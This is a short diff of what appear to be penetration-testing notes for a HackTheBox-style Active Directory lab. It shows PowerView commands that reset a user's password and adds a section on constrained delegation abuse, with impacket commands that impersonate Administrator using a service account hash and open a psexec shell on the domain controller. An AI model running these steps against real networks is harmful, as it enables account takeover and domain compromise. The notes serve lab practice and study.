@@ -56,3 +56,13 @@ Change it using PowerView:
     1. $newpass = ConverTo-SecureString 'Password1234!' -AsPlainText -Force
     2. SetDomainPassword -Identity smith -AccountPassword $newpass
 
+### AllowsToDelegate
+The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer.
+
+Exploit
+
+Get a service ticket using impacket:
+
+    1. impacket-getST.py -spn cifs/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes :67065141d298d67a17ee8626476b20f9
+    2. export KRB5CCNAME=Administrator.ccache
+    3. impacket-psexec -k -no-pass dc.intelligence.htb
